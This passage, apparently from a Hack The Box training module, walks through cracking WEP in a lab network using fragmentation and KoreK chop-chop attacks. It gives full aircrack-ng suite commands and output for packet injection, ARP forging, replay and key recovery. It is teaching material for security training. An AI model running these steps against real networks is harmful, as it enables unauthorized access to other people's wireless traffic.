+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ packetforge-ng <span class="hljs-number">-0</span> -a <span class="hljs-string">A2:</span><span class="hljs-string">BD:</span><span class="hljs-number">32</span>:<span class="hljs-string">EB:</span><span class="hljs-number">21</span>:<span class="hljs-number">15</span> -h <span class="hljs-number">42</span>:<span class="hljs-string">E9:</span><span class="hljs-number">11</span>:<span class="hljs-number">39</span>:<span class="hljs-number">88</span>:AE -k <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> -l <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.129</span> -y fragment<span class="hljs-number">-0805</span><span class="hljs-number">-191851.</span>xor -w forgedarp.cap
+
+Wrote packet <span class="hljs-string">to:</span> forgedarp.cap
+</code></pre>
+<p> If the packet we captured does not contain source or destination IP addresses, we can set the -k (access point's IP) option to 255.255.255.255 and the -l (station's IP) option to 255.255.255.255. This allows us to handle packets without specified IP addresses by designating them as broadcast addresses.</p>
+<p>Once the forged ARP request is written into <code>forgedarp.cap</code>, we can inject it into the target network to generate initialization vectors (IVs). One common method for this is using the Aircrack Suite's <a href="https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay">Interactive Packet Replay</a>.</p>
+<p>We do so by specifying the interactive packet replay mode with <code>-2</code>, the name and location of our forged packet with <code>-r</code>, the source MAC address to inject with <code>-h</code> and our interface in monitor mode with <code>wlan0mon</code> as shown below.</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aireplay-ng -<span class="hljs-number">2</span> -r forgedarp.cap -h <span class="hljs-number">42</span>:E<span class="hljs-number">9:11:39:88</span>:AE wlan0mon
+
+The interface MAC (<span class="hljs-number">02:00:00:00</span>:<span class="hljs-number">01</span>:<span class="hljs-number">00</span>) doesn't match the specified MAC (-h).
+        ifconfig wlan0mon hw ether <span class="hljs-number">42</span>:E<span class="hljs-number">9:11:39:88</span>:AE
+
+        Size: <span class="hljs-number">68</span>, FromDS: <span class="hljs-number">0</span>, ToDS: <span class="hljs-number">1</span> (WEP)
+
+              BSSID  =  A2:BD:<span class="hljs-number">32</span>:EB:<span class="hljs-number">21</span>:<span class="hljs-number">15</span>
+          Dest. MAC  =  FF:FF:FF:FF:FF:FF
+         Source MAC  =  <span class="hljs-number">42</span>:E<span class="hljs-number">9:11:39:88</span>:AE
+
+        <span class="hljs-number">0</span>x0000:  <span class="hljs-number">0841 0201</span> d8d6 <span class="hljs-number">3d</span>eb <span class="hljs-number">29d5 42e9</span> <span class="hljs-number">1139</span> <span class="hljs-number">88</span>ae  .<span class="hljs-keyword">A</span>....=.).B..<span class="hljs-number">9</span>..
+        <span class="hljs-number">0</span>x0010:  ffff ffff ffff <span class="hljs-number">8001</span> <span class="hljs-number">369</span>f d<span class="hljs-number">800 5899</span> <span class="hljs-number">17</span>e1  ........<span class="hljs-number">6</span>...X...
+        <span class="hljs-number">0</span>x0020:  <span class="hljs-number">4841</span> <span class="hljs-number">7</span>fed f<span class="hljs-number">893 7419</span> <span class="hljs-number">9d</span>0f d<span class="hljs-number">368 9341</span> f130  HA...t....h.<span class="hljs-keyword">A</span>.<span class="hljs-number">0</span>
+        <span class="hljs-number">0</span>x0030:  c021 <span class="hljs-number">668</span>c <span class="hljs-number">9</span>f07 a5ec <span class="hljs-number">15</span>be <span class="hljs-number">3583</span> df2c b474  .!f.......<span class="hljs-number">5</span>..,.t
+        <span class="hljs-number">0</span>x0040:  cf84 <span class="hljs-number">1d</span>db....
+
+Use this packet ? y
+
+Saving chosen packet in replay_src-<span class="hljs-number">0805-192042</span>.cap
+You should also start airodump-ng to capture replies.
+
+Sent <span class="hljs-number">1400</span> packets...(<span class="hljs-number">499</span> pps)
+</code></pre>
+<p>As this process runs, back in the <code>airodump-ng</code> output we can notice that the <code>Frames</code> count for the connected station increases. This is a positive sign that many IVs are being generated.</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session"> CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 2 </span>mins ][ 2024-08-05 20:20 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ A2:BD:32:EB:21:15  -47  <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 1584 </span>  <span class="hljs-number"> 23983 </span><span class="hljs-number"> 923 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 11 </span>  WEP  WEP         HackTheWifi
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ A2:BD:32:EB:21:15  42:E9:11:39:88:AE  -48  <span class="hljs-number"> 11 </span>-<span class="hljs-number"> 1 </span>    <span class="hljs-number"> 0 </span>   36015
+</code></pre>
+<p>To further accelerate the IV generation process, we can launch an ARP request replay attack in a new terminal. This approach will enhance the rate at which new IVs are created, helping to expedite the overall process.</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo aireplay-ng -3 -b A2:BD:32:EB:21:15 -<span class="hljs-keyword">h</span> 42:E9:11:39:88:AE wlan0mon
+
+The interface <span class="hljs-keyword">MAC</span> (02:00:00:00:01:00) doesn't match the specified <span class="hljs-keyword">MAC</span> (-<span class="hljs-keyword">h</span>).
+        ifconfig wlan0mon hw ether 42:E9:11:39:88:AE
+19:21:47  Waiting <span class="hljs-keyword">for</span> beacon frame (BSSID: A2:BD:32:EB:21:15) <span class="hljs-keyword">on</span> channel 1
+Saving ARP requests <span class="hljs-keyword">in</span> replay_arp-0805-192147.<span class="hljs-keyword">cap</span>
+You should also start airodump-ng to <span class="hljs-keyword">capture</span> replies.
+<span class="hljs-keyword">Read</span> 133226 packets (got 30681 ARP requests and 0 ACKs), sent 27992 packets...(499 pps)
+</code></pre>
+<p>Once enough packets have been gathered, we can use aircrack-ng to crack the WEP key from the captured IVs stored in the <code>WEP-01.cap</code> file:</p>
+<p>  Fragmentation Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aircrack-ng -<span class="hljs-selector-tag">b</span> A2:BD:<span class="hljs-number">32</span>:EB:<span class="hljs-number">21</span>:<span class="hljs-number">15</span> WEP-<span class="hljs-number">01</span><span class="hljs-selector-class">.cap</span>
+
+Got <span class="hljs-number">85311</span> out of <span class="hljs-number">85000</span> IVs
+Starting PTW attack with <span class="hljs-number">85311</span> ivs.   
+
+                     KEY FOUND! [ <span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span>:<span class="hljs-number">11</span> ]    
+
+Reading Decrypted correctly: <span class="hljs-number">100%</span>                                                                                                                        
+Opening WEP-<span class="hljs-number">01</span><span class="hljs-selector-class">.cap</span>                                                                                                                                       
+Read <span class="hljs-number">306522</span> packets.
+</code></pre>
+<hr>
+<h2 id="korek-chop-chop-attack">Korek Chop Chop Attack</h2>
+<hr>
+<p>Not all access points (APs) are equal. During an assessment, we may find some are more vulnerable to fragmentation than others. As an alternative, we can employ the <a href="https://www.aircrack-ng.org/doku.php?id=korek_chopchop">Korek Chop Chop Attack</a> to similarly capture a packet and retrieve the 1500 bytes of PRGA. Known technically as an <code>Inverse Arbaugh</code> attack, chop chop uses inductive reasoning to decrypt the packet without needing the key.</p>
+<p>This is achieved by abusing the Integrity Check Value (ICV) in WEP. If we recall, the ICV ensures the integrity of the transmitted message. In the case of WEP, the CRC32 algorithm is used to calculate this value; if the ICV of a packet is not valid, it will be dropped by the access point (AP) upon receipt. This seemingly benign interaction creates an opportunity for attackers.</p>
+<p>The attack works like this: after capturing a legitimate packet, the last byte of the encrypted message is removed and assigned a value (from 0-255) that we guess, starting at zero. A series of <a href="https://www.aircrack-ng.org/doku.php?id=chopchoptheory">calculations</a> is performed to determine the ICV of the truncated packet, which has a mathematical relationship to the value of the missing byte. This new packet is sent into the network as we await the AP's response. If the packet is dropped, we guess a different number and try again. If the packet isn't dropped, it means our guess was correct, thus revealing the true value of the byte. We then "chop off" the next byte and repeat the process. As the packet is decrypted byte by byte, we are able to recover the PRGA simultaneously.</p>
+<p>With the resulting keystream data (.xor file), we are able to craft and encrypt packets that look legitimate within the network. This allows us to subsequently perform the ARP request replay attack.</p>
+<hr>
+<p>We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.</p>
+<p><strong>Enabling Monitor Mode</strong></p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>After setting the interface into monitor mode, we can verify the change by using the <code>iwconfig</code> utility.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<p><strong>Performing the Attack</strong></p>
+<p>To begin, we scan our target access point using <code>airodump-ng</code> and capture the communication into a file. We specify our interface in monitor mode with <code>wlan0mon</code>, the channel our access point is running on with <code>-c</code>, and the location to save the capture file with the <code>-w</code> argument.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ airodump-ng wlan0mon -c<span class="hljs-number"> 1 </span>-w WEP
+
+21:38:45  Created capture file "WEP-01.cap".                                                                                                
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 37 </span>mins ][ 2024-08-05 22:15 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ C8:D1:4D:EA:21:A6  -47<span class="hljs-number"> 100 </span>  <span class="hljs-number"> 21573 </span> <span class="hljs-number"> 116394 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 11 </span>  WEP  WEP         HackTheWifi                                                   
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ C8:D1:4D:EA:21:A6  7E:8D:FC:DD:D7:2C  -29   <span class="hljs-number"> 1 </span>-<span class="hljs-number"> 5 </span>    <span class="hljs-number"> 0 </span>     85
+</code></pre>
+<p>Next, we initiate the <code>KoreK chop chop</code> attack in a second terminal. The source MAC address used should be capable of associating with the network. If we need to conduct the attack without authentication and association, there are two options: either omit the <code>-h</code> flag (though this can result in dropped packets), or specify the MAC address of an already connected station, which tends to be more reliable. The <code>-4</code> option in <code>aireplay-ng</code> is used for the KoreK chop chop attack.</p>
+<p>Similar to fragmentation attacks, we want to capture a packet originating from a connected station and destined for the AP. Once a valid packet is found, we approve the selection and start the attack, retrieving the PRGA keystream bit by bit.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aireplay-ng -4 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon
+
+The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
+        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C
+22:09:49  Waiting for beacon frame (BSSID: C8:D1:4D:EA:21:A6) on channel 1
+
+        Size: 100, FromDS: 0, ToDS:<span class="hljs-number"> 1 </span>(WEP)
+
+              BSSID  =  C8:D1:4D:EA:21:A6
+          Dest. MAC  =  C8:D1:4D:EA:21:A6
+         Source MAC  =  7E:8D:FC:DD:D7:2C
+
+        0x0000: <span class="hljs-number"> 0841 </span>0201 d8d6 3deb 29d5 7e8d fcdd d72c  .A....=.).~....,
+        0x0010:  d8d6 3deb 29d5<span class="hljs-number"> 3066 </span>daa0 0a00 3cf2 9b22  ..=.).0f....&lt;.."
+        0x0020:  140f<span class="hljs-number"> 1281 </span>b336 3dc3<span class="hljs-number"> 7697 </span>157a 88d9<span class="hljs-number"> 2460 </span> .....6=.v..z..$`
+        0x0030:  ed13 410b bea6 9b5d ce96 add6 75fb a0f8  ..A....]....u...
+        0x0040: <span class="hljs-number"> 6878 </span>7ea3 d70a 425f 2c14 a71a<span class="hljs-number"> 2715 </span>75a6  hx~...B_,...'.u.
+        0x0050:  b9ee c1d2 4e19 ae2b e93c c9ab fc28 959f  ....N..+.&lt;...(..
+        0x0060:  9a1d 597d                                ..Y}
+
+Use this packet ? y
+
+Saving chosen packet in replay_src-0805-220949.cap
+
+Offset  <span class="hljs-number"> 87 </span>( 0% done) | xor =<span class="hljs-number"> 13 </span>| pt =<span class="hljs-number"> 53 </span>|  <span class="hljs-number"> 83 </span>frames written in  1419ms
+Offset  <span class="hljs-number"> 86 </span>( 1% done) | xor =<span class="hljs-number"> 64 </span>| pt = B8 |  <span class="hljs-number"> 98 </span>frames written in  1660ms
+Offset  <span class="hljs-number"> 85 </span>( 3% done) | xor = 5D | pt = 0C |  <span class="hljs-number"> 80 </span>frames written in  1360ms
+Offset  <span class="hljs-number"> 84 </span>( 5% done) | xor =<span class="hljs-number"> 64 </span>| pt = F3 |   <span class="hljs-number"> 4 </span>frames written in    67ms
+Offset  <span class="hljs-number"> 83 </span>( 7% done) | xor = 7B | pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 65 </span>frames written in  1097ms
+Offset  <span class="hljs-number"> 82 </span>( 9% done) | xor =<span class="hljs-number"> 21 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 219 </span>frames written in  3717ms
+Offset  <span class="hljs-number"> 81 </span>(11% done) | xor = F0 | pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 17 </span>frames written in   286ms
+Offset  <span class="hljs-number"> 80 </span>(12% done) | xor =<span class="hljs-number"> 44 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 116 </span>frames written in  1966ms
+Offset  <span class="hljs-number"> 79 </span>(14% done) | xor = 3C | pt = 8E |  <span class="hljs-number"> 37 </span>frames written in   621ms
+Offset  <span class="hljs-number"> 78 </span>(16% done) | xor =<span class="hljs-number"> 48 </span>| pt = F7 | <span class="hljs-number"> 190 </span>frames written in  3206ms
+Offset  <span class="hljs-number"> 77 </span>(18% done) | xor = 4C | pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 232 </span>frames written in  3935ms
+Offset  <span class="hljs-number"> 76 </span>(20% done) | xor = B1 | pt =<span class="hljs-number"> 85 </span>|  <span class="hljs-number"> 56 </span>frames written in   940ms
+Offset  <span class="hljs-number"> 75 </span>(22% done) | xor = 0B | pt =<span class="hljs-number"> 02 </span>| <span class="hljs-number"> 159 </span>frames written in  2686ms
+Offset  <span class="hljs-number"> 74 </span>(24% done) | xor = C0 | pt =<span class="hljs-number"> 00 </span>|   <span class="hljs-number"> 6 </span>frames written in   102ms
+Offset  <span class="hljs-number"> 73 </span>(25% done) | xor = FB | pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 60 </span>frames written in  1030ms
+Offset  <span class="hljs-number"> 72 </span>(27% done) | xor =<span class="hljs-number"> 98 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 186 </span>frames written in  3155ms
+Offset  <span class="hljs-number"> 71 </span>(29% done) | xor =<span class="hljs-number"> 85 </span>| pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 95 </span>frames written in  1622ms
+Offset  <span class="hljs-number"> 70 </span>(31% done) | xor = DA | pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 167 </span>frames written in  2817ms
+Offset  <span class="hljs-number"> 69 </span>(33% done) | xor = 0B | pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 94 </span>frames written in  1581ms
+Offset  <span class="hljs-number"> 68 </span>(35% done) | xor = 6E | pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 19 </span>frames written in   323ms
+Offset  <span class="hljs-number"> 67 </span>(37% done) | xor = F0 | pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 225 </span>frames written in  3800ms
+Offset  <span class="hljs-number"> 66 </span>(38% done) | xor = C4 | pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 110 </span>frames written in  1855ms
+Offset  <span class="hljs-number"> 65 </span>(40% done) | xor = 2B | pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 43 </span>frames written in   724ms
+Offset  <span class="hljs-number"> 64 </span>(42% done) | xor =<span class="hljs-number"> 79 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 116 </span>frames written in  1958ms
+Offset  <span class="hljs-number"> 63 </span>(44% done) | xor = F6 | pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 216 </span>frames written in  3659ms
+Offset  <span class="hljs-number"> 62 </span>(46% done) | xor = A2 | pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 39 </span>frames written in   662ms
+Offset  <span class="hljs-number"> 61 </span>(48% done) | xor =<span class="hljs-number"> 46 </span>| pt =<span class="hljs-number"> 02 </span>| <span class="hljs-number"> 107 </span>frames written in  1808ms
+Offset  <span class="hljs-number"> 60 </span>(50% done) | xor = 0B | pt = FF |  <span class="hljs-number"> 97 </span>frames written in  1639ms
+Offset  <span class="hljs-number"> 59 </span>(51% done) | xor = FB | pt = E1 | <span class="hljs-number"> 125 </span>frames written in  2121ms
+Offset  <span class="hljs-number"> 58 </span>(53% done) | xor = AA | pt = C4 | <span class="hljs-number"> 239 </span>frames written in  4060ms
+Offset  <span class="hljs-number"> 57 </span>(55% done) | xor =<span class="hljs-number"> 05 </span>| pt =<span class="hljs-number"> 08 </span>|  <span class="hljs-number"> 97 </span>frames written in  1636ms
+Offset  <span class="hljs-number"> 56 </span>(57% done) | xor = CB | pt = A7 | <span class="hljs-number"> 234 </span>frames written in  3966ms
+Offset  <span class="hljs-number"> 55 </span>(59% done) | xor =<span class="hljs-number"> 77 </span>| pt = 7E | <span class="hljs-number"> 247 </span>frames written in  4179ms
+Offset  <span class="hljs-number"> 54 </span>(61% done) | xor = CB | pt = 0C |  <span class="hljs-number"> 17 </span>frames written in   283ms
+Offset  <span class="hljs-number"> 53 </span>(62% done) | xor = 5A | pt =<span class="hljs-number"> 40 </span>| <span class="hljs-number"> 223 </span>frames written in  3776ms
+Offset  <span class="hljs-number"> 52 </span>(64% done) | xor = A4 | pt = 0D | <span class="hljs-number"> 189 </span>frames written in  3227ms
+Offset  <span class="hljs-number"> 51 </span>(66% done) | xor =<span class="hljs-number"> 67 </span>| pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 67 </span>frames written in  1137ms
+Offset  <span class="hljs-number"> 50 </span>(68% done) | xor =<span class="hljs-number"> 11 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 153 </span>frames written in  2587ms
+Offset  <span class="hljs-number"> 49 </span>(70% done) | xor =<span class="hljs-number"> 53 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 149 </span>frames written in  2531ms
+Offset  <span class="hljs-number"> 48 </span>(72% done) | xor =<span class="hljs-number"> 69 </span>| pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 85 </span>frames written in  1438ms
+Offset  <span class="hljs-number"> 47 </span>(74% done) | xor =<span class="hljs-number"> 19 </span>| pt =<span class="hljs-number"> 00 </span>|  <span class="hljs-number"> 40 </span>frames written in   674ms
+Offset  <span class="hljs-number"> 46 </span>(75% done) | xor =<span class="hljs-number"> 05 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 150 </span>frames written in  2535ms
+Offset  <span class="hljs-number"> 45 </span>(77% done) | xor = 9C | pt =<span class="hljs-number"> 80 </span>|  <span class="hljs-number"> 36 </span>frames written in   606ms
+Offset  <span class="hljs-number"> 44 </span>(79% done) | xor =<span class="hljs-number"> 41 </span>| pt = FE | <span class="hljs-number"> 213 </span>frames written in  3583ms
+Offset  <span class="hljs-number"> 43 </span>(81% done) | xor =<span class="hljs-number"> 32 </span>| pt = FF | <span class="hljs-number"> 200 </span>frames written in  3381ms
+Offset  <span class="hljs-number"> 42 </span>(83% done) | xor =<span class="hljs-number"> 16 </span>| pt = 3A | <span class="hljs-number"> 192 </span>frames written in  3257ms
+Offset  <span class="hljs-number"> 41 </span>(85% done) | xor =<span class="hljs-number"> 49 </span>| pt =<span class="hljs-number"> 08 </span>| <span class="hljs-number"> 218 </span>frames written in  3717ms
+Offset  <span class="hljs-number"> 40 </span>(87% done) | xor =<span class="hljs-number"> 35 </span>| pt =<span class="hljs-number"> 00 </span>| <span class="hljs-number"> 136 </span>frames written in  2316ms
+
+Sent<span class="hljs-number"> 946 </span>packets, current guess: AE...
+
+The AP appears to drop packets shorter than<span class="hljs-number"> 40 </span>bytes.
+Enabling standard workaround:  IP header re-creation.
+
+Saving plaintext in replay_dec-0805-221220.cap
+Saving keystream in replay_dec-0805-221220.xor
+
+Completed in 141s (0.44 bytes/s)
+</code></pre>
+<p>Once the attack is completed, we will have two files to work with to forge our ARP request.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ls
+
+replay_dec<span class="hljs-number">-0805</span><span class="hljs-number">-221220.</span>cap
+replay_dec<span class="hljs-number">-0805</span><span class="hljs-number">-221220.</span>xor
+</code></pre>
+<p>Now, analyze the decrypted packet to identify the source and destination IP addresses.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ tcpdump -s <span class="hljs-number">0</span> -n -e -r replay_dec<span class="hljs-number">-0805</span><span class="hljs-number">-221220.</span>cap       
+
+reading from file replay_dec<span class="hljs-number">-0805</span><span class="hljs-number">-221220.</span>cap, link-type IEEE802_11 (<span class="hljs-number">802.11</span>), snapshot length <span class="hljs-number">65535</span>                                            
+<span class="hljs-number">22</span>:<span class="hljs-number">12</span>:<span class="hljs-number">20.091153</span> <span class="hljs-string">BSSID:</span><span class="hljs-string">c8:</span><span class="hljs-string">d1:</span><span class="hljs-number">4</span><span class="hljs-string">d:</span><span class="hljs-string">ea:</span><span class="hljs-number">21</span>:a6 <span class="hljs-string">SA:</span><span class="hljs-number">7</span><span class="hljs-string">e:</span><span class="hljs-number">8</span><span class="hljs-string">d:</span><span class="hljs-string">fc:</span><span class="hljs-string">dd:</span><span class="hljs-string">d7:</span><span class="hljs-number">2</span>c <span class="hljs-string">DA:</span><span class="hljs-string">c8:</span><span class="hljs-string">d1:</span><span class="hljs-number">4</span><span class="hljs-string">d:</span><span class="hljs-string">ea:</span><span class="hljs-number">21</span>:a6 LLC, dsap SNAP (<span class="hljs-number">0xaa</span>) Individual, ssap SNAP (<span class="hljs-number">0xaa</span>) Command, 
+ctrl <span class="hljs-number">0x03</span>: oui Ethernet (<span class="hljs-number">0x000000</span>), ethertype IPv4 (<span class="hljs-number">0x0800</span>), length <span class="hljs-number">60</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.75</span><span class="hljs-number">.43748</span> &gt; <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">.443</span>: Flags [S], seq <span class="hljs-number">4053382319</span>, win <span class="hljs-number">6</span>
+<span class="hljs-number">4240</span>, options [mss <span class="hljs-number">1460</span>,sackOK,TS val <span class="hljs-number">4080146584</span> ecr <span class="hljs-number">0</span>,nop,wscale <span class="hljs-number">7</span>], length <span class="hljs-number">0</span>
+</code></pre>
+<p>After identifying the required IP addresses, we can forge an ARP request using <code>packetforge-ng</code>. In this command, we specify the access point's MAC address with <code>-a</code>, the station’s MAC address with <code>-h</code>, the access point’s IP address with <code>-k</code>, the station’s IP address with <code>-l</code>, the location and name of our PRGA file with <code>-y</code>, and finally, the output name for the forged ARP request capture file with <code>-w</code>.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ packetforge-ng <span class="hljs-number">-0</span> -a <span class="hljs-string">C8:</span><span class="hljs-string">D1:</span><span class="hljs-number">4</span><span class="hljs-string">D:</span><span class="hljs-string">EA:</span><span class="hljs-number">21</span>:A6 -h <span class="hljs-number">7</span><span class="hljs-string">E:</span><span class="hljs-number">8</span><span class="hljs-string">D:</span><span class="hljs-string">FC:</span><span class="hljs-string">DD:</span><span class="hljs-string">D7:</span><span class="hljs-number">2</span>C -k <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> -l <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.75</span> -y replay_dec<span class="hljs-number">-0805</span><span class="hljs-number">-221220.</span>xor -w forgedarp.cap
+
+Wrote packet <span class="hljs-string">to:</span> forgedarp.cap
+</code></pre>
+<p>Once the forged packet is saved as <code>forgedarp.cap</code>, we can inject it into the target network to generate initialization vectors (IVs). One common way to do this is by using <a href="https://www.aircrack-ng.org/doku.php?id=interactive_packet_replay">Interactive Packet Replay</a>.</p>
+<p>We do so by specifying the interactive packet replay mode with <code>-2</code>, the name and location of our forged packet with <code>-r</code>, the source MAC address to inject with <code>-h</code>, and our interface in monitor mode with <code>wlan0mon</code> as shown below.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aireplay-ng -2 -r forgedarp.<span class="hljs-keyword">cap</span> -<span class="hljs-keyword">h</span> 7E:8D:FC:DD:D7:2C wlan0mon
+
+The interface <span class="hljs-keyword">MAC</span> (02:00:00:00:01:00) doesn't match the specified <span class="hljs-keyword">MAC</span> (-<span class="hljs-keyword">h</span>).
+        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C
+
+
+        Size: 68, FromDS: 0, ToDS: 1 (WEP)
+
+              BSSID  =  C8:D1:4D:EA:21:A6
+          Dest. <span class="hljs-keyword">MAC</span>  =  FF:FF:FF:FF:FF:FF
+         Source <span class="hljs-keyword">MAC</span>  =  7E:8D:FC:DD:D7:2C
+
+        0x0000:  0841 0201 d8d6 3deb 29d5 7e8d fcdd d72c  .A....=.).~....,
+        0x0010:  ffff ffff ffff 8001 daa0 0a00 3cf2 9b22  ............&lt;.."
+        0x0020:  140f 1287 f637 35ff dc9f 557b b652 d3ae  .....75...<span class="hljs-keyword">U</span>{.R..
+        0x0030:  fa97 80e8 7f8f 9a5c 6472 ac6d 44ca 1556  ......\dr.mD..V
+        0x0040:  e423 69ca                                .#i.
+
+<span class="hljs-keyword">Use</span> this packet ? <span class="hljs-built_in">y</span>
+
+Saving chosen packet <span class="hljs-keyword">in</span> replay_src-0805-221358.<span class="hljs-keyword">cap</span>
+You should also start airodump-ng to <span class="hljs-keyword">capture</span> replies.
+
+Sent 3503 packets...(500 pps)
+</code></pre>
+<p>As this process runs, back in the <code>airodump-ng</code> output we can notice that the <strong>Frames</strong> count for the connected station increases. This is a positive sign that many new IVs are being generated.</p>
+<p>We can wait until enough packets have been generated before attempting to crack the WEP key. Additionally, to further accelerate the IV generation process, we can use an ARP request replay attack in a new terminal. This approach will expedite the overall process.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aireplay-ng -3 -b C8:D1:4D:EA:21:A6 -<span class="hljs-keyword">h</span> 7E:8D:FC:DD:D7:2C wlan0mon
+
+The interface <span class="hljs-keyword">MAC</span> (02:00:00:00:01:00) doesn't match the specified <span class="hljs-keyword">MAC</span> (-<span class="hljs-keyword">h</span>).
+        ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C
+22:14:47  Waiting <span class="hljs-keyword">for</span> beacon frame (BSSID: C8:D1:4D:EA:21:A6) <span class="hljs-keyword">on</span> channel 1
+Saving ARP requests <span class="hljs-keyword">in</span> replay_arp-0805-221447.<span class="hljs-keyword">cap</span>
+You should also start airodump-ng to <span class="hljs-keyword">capture</span> replies.
+<span class="hljs-keyword">Read</span> 186176 packets (got 69052 ARP requests and 0 ACKs), sent 26781 packets...(499 pps)
+</code></pre>
+<p>Once we have generated enough packets, we can use <code>aircrack-ng</code> to crack the WEP key using the captured Initialization Vectors (IVs) stored in the <code>WEP-01.cap</code> file.</p>
+<p>  Korek Chop Chop Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ aircrack-ng -b <span class="hljs-string">C8:</span><span class="hljs-string">D1:</span><span class="hljs-number">4</span><span class="hljs-string">D:</span><span class="hljs-string">EA:</span><span class="hljs-number">21</span>:A6 WEP<span class="hljs-number">-01.</span>cap 
+
+Reading packets, please wait...
+Opening WEP<span class="hljs-number">-01.</span>cap
+Read <span class="hljs-number">251698</span> packets.
+
+<span class="hljs-number">1</span> potential targets                                     Got <span class="hljs-number">116410</span> out of <span class="hljs-number">115000</span> IVs
